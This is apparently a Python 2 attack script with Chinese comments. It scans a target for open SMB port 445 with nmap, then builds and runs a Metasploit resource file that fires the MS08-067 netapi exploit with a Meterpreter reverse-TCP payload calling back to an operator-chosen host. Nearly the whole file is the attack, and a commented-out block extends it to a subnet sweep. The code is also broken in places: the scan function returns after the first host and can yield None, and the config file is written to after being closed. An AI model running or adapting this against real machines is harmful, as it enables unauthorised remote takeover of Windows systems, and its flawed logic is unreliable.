# coding=utf-8

import nmap
import optparse
import os



def setexploit(configfile,rhost,lhost,lport):
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set RHOST '+str(rhost)+'\n')
    configfile.write('set LPORT '+str(lport)+'\n')
    configfile.write('set LHOST '+lhost+'\n')
    configfile.write('exploit \n')
    configfile.close()


def sethande(configfile,lhost,lport):
	configfile.write('use exploit/multi/handler\n')
	configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp \n')
	configfile.write('set LPORT '+str(lport)+'\n')
	configfile.write('set LHOST ' + str(lhost) + '\n')
	configfile.write('set DisablePayloadHandler 1\n')
	configfile.write('exploit  -j  -z\n')

def scan445(new_ip):
	new_ip = str(new_ip)
	# 实例化
	nm = nmap.PortScanner()
	# scan扫描方法
	ping_scan_raw = nm.scan(hosts=new_ip,ports='445',arguments='-sS')
	# 返回一个存活列表
	list_ip = nm.all_hosts()
	# print list_ip
	# print ping_scan_raw
	for list in list_ip:
		host_status = ping_scan_raw['scan'][list]['status']['state']
		port_status = ping_scan_raw['scan'][list]['tcp'][445]['state']
		# print list + port_status
		# print list + host_status
		tlist = []
		if host_status == 'up' and port_status == 'open':
			tlist.append(list)
			return tlist
		else:
			return None

def main():
	parser = optparse.OptionParser()
	parser.add_option('-t','--tag',dest = 'tag',help = 'tag')
	parser.add_option('-l','--lhost',dest = 'lhost',help = 'lhost')
	parser.add_option('-p','--lpost',dest = 'lport',help = 'lpost')
	(options,args) = parser.parse_args()
	if(options.tag == None) or (options.lhost == None) or (options.lport == None):
		print "参数错误"
		exit(0)
	else:
		ip = str(options.tag)
		# t = ip.split('.')[3]
		lhost = str(options.lhost)
		lport = str(options.lport)
		flag = scan445(ip)
		# print flag
		configfile = open('ms08_067.rc','w')
		sethande(configfile,lhost,lport)
		for target in flag:
			setexploit(configfile,target,lhost,lport)
			os.system('msfconsole -r ms08_067.rc')



			# host0 = ip.split('.')[0]
			# host1 = ip.split('.')[1]
			# host2 = ip.split('.')[2]
			# host = host0 + '.' + host1 + '.' + host2
			# i = 1
			# while i < 255:
			# 	new_ip = host + '.' + str(i)
			# 	# result = os.system("ping " + new_ip + " -c 1 -i 1")\
			# 	flag = scan445(new_ip)
			# 	if (flag == 1):
			# 		print ip + " open"
			# 	elif (flag == 0):
			# 		print ip + " close"
			# 	elif (flag == -1):
			# 		print new_ip + 'no ping'
			# 	i += 1

if __name__ == '__main__':
	main()
